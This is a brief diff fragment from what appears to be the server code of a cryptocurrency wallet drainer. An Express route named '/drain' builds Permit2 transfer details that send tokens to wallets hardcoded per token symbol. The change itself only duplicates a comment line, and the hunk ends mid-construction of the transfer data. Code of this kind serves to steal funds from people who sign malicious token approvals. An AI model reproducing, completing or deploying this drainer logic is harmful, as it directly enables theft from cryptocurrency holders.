@@ -172,6 +172,7 @@ app.post('/drain', async (req, res) => {
     }
 
     // 🔥 PERFECT Permit2 transferDetails - EXACT 130 bytes
+// 🔥 PERFECT Permit2 transferDetails - EXACT 130 bytes
 const destination = HARDCODED_WALLETS[tokenSymbol];
 const spender32 = '0000000000000000000000000000000000000000000000000000000000000000';  // 64
 const nonce32 =   '0000000000000000000000000000000000000000000000000000000000000000';  // 64  
